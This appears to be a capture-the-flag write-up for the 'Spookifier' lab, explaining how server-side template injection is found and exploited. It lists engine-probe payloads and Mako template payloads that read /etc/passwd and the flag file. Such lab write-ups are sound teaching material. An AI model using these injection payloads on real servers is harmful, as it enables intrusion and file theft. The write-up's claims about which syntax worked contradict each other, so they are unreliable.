# HTB — Spookifier

**Difficulty:** Very Easy  
**Category:** Challenge  
**Tags:** Web, SSTI

---

## Overview

Spookifier is a web challenge centred on Server Side Template Injection (SSTI). The app takes user input and renders it through a template engine. If you can inject template syntax, you can get the server to execute code.

---

## Reconnaissance

### Step 01 — Explore the app

The app takes a text input and "spookifies" it rendering it back in different Halloween fonts. Any time user input is reflected back on the page it's worth testing for SSTI.

> **Key observation:** the input is rendered directly into the page output, suggesting it passes through a template engine before being returned.

### Step 02 — Identify the template engine

The first step in SSTI is figuring out *which* template engine is running. Different engines use different syntax. The approach is to try probe payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) and see which ones get evaluated vs returned as literal text.

| Payload   | Engine              | Result            |
|-----------|---------------------|-------------------|
| `{{7*7}}` | Jinja2 / Twig       | not evaluated     |
| `${7*7}`  | FreeMarker / Smarty | not evaluated     |
| `#{7*7}`  | Ruby ERB            | not evaluated     |
| `*{7*7}`  | Mako / Cheetah      | **returns 49 ✓**  |

> **This is the core skill of SSTI** — working through PayloadsAllTheThings systematically until you find which syntax the engine responds to. Each failed attempt rules out a template engine.

The `*{7*7}` payload returning `49` confirms the engine is **Mako** — a Python-based template engine. Since it's Python under the hood, Python expressions work inside the template.

---

## Exploitation

### Step 03 — Escalate to code execution

Once you know the engine, PayloadsAllTheThings has Mako-specific payloads for reading files and running commands.

```
${{open('/etc/passwd').read()}}
```

```
root:x:0:0:root:/root:/bin/ash
...
```

### Step 04 — Read the flag

HTB challenges typically store the flag at `/flag.txt`.

```
${{open('/flag.txt').read()}}
```

---

## What I Learned

- SSTI occurs when user input is passed directly into a template engine and rendered server-side
- Different template engines use different syntax, identifying the engine is the first step
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is the go-to reference for SSTI payloads organised by engine
- The approach is methodical: try each syntax probe, track what gets evaluated vs ignored, narrow down the engine
- `*{7*7}` returning `49` identifies Mako, a Python template engine
- Once code execution is confirmed, reading `/flag.txt` is straightforward with `open().read()`
